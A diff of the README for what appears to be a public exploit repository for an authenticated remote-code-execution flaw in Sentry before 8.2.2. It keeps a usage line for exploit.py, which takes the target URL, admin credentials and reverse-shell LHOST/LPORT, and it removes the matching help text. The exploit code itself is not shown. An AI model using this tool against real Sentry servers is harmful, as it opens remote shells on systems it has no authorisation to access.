@@ -10,20 +10,6 @@
 <h4> Usage : python exploit.py --url `http://puturhostnamehere/auth/login/sentry/` -U `username` -P `password` -l `LHOST` -p `LPORT`</h4>
   
 
-usage: exploit.py [-h] [-U U] [-P P] [-l L] [-p P] [--url URL]
-
-Sentry < 8.2.2 Authenticated RCE
-
-<p>              
-optional arguments:
-  -h, --help  show this help message and exit
-  -U U        Sentry Admin Username / Email
-  -P P        Sentry Admin Password
-  -l L        Rev Shell LHOST
-  -p P        Rev Shell LPORT
-  --url URL   Sentry Login URL
-<p>            
-              
 ![alt text](https://github.com/mohinparamasivam/Sentry-Authenticated-Remote-Code-Execution/blob/main/sentry_exploit.png?raw=true)              
               
 
